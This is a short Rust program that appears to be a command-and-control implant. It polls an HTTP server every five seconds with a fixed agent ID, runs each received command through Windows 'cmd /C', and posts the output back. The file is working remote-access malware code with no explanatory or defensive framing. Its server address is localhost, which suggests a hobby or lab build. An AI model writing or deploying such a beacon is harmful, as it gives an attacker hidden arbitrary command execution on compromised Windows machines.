use std::process::Command;
use std::time::Duration;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};

#[derive(Deserialize, Debug)]
struct TaskData {
	task_id: String,
	command: String,
}
#[derive(Serialize)]
pub struct TaskResult {
	pub id: String,
	pub output: String,
	pub status: String,
}

fn poll(url: &str, agent_id: &str) -> Result<Vec<TaskData>, String> {
	let client = Client::new();
	let res =  client
		.get(url)
		.header("Authorization", agent_id)
		.send().map_err(|e| e.to_string())?;
	let tasks = res.json::<Vec<TaskData>>().map_err(|e| e.to_string())?;
	Ok(tasks)
}

fn execute(task: TaskData) -> TaskResult {
	let res = Command::new("cmd")
		.args(["/C", task.command.as_str()])
		.output().map_err(|e| e.to_string());
	
	match res {
		Ok(ok_res) => TaskResult {
			id: task.task_id,
			output: String::from_utf8(ok_res.stdout).unwrap(),
			status: "Success".to_string(),
		},
		Err(err) => TaskResult {
			id: task.task_id,
			output: err,
			status: "Error".to_string(),
		},
	}
}

fn send_result(url: &str, agent_id: &str, task_res: TaskResult) -> Result<(), reqwest::Error> {
	let client = Client::new();
	let _res =  client
		.post(url)
		.json(&task_res)
		.header("Authorization", agent_id)
		.send()?;
	Ok(())
}


fn main() -> Result<(), String> {
	let id = "01912a94-2d2b-75f3-a024-149a9b56450b";
	loop {
		let tasks = poll("http://localhost:3000/poll", id)?;
		if !tasks.is_empty() {
			println!("[^-^] We have a new task !");
			for task in tasks {
				let result = execute(task);
				send_result("http://localhost:3000/update_task", id, result)
					.map_err(|e| e.to_string())?;
			}
		}
		std::thread::sleep(Duration::from_secs(5));
	}
}



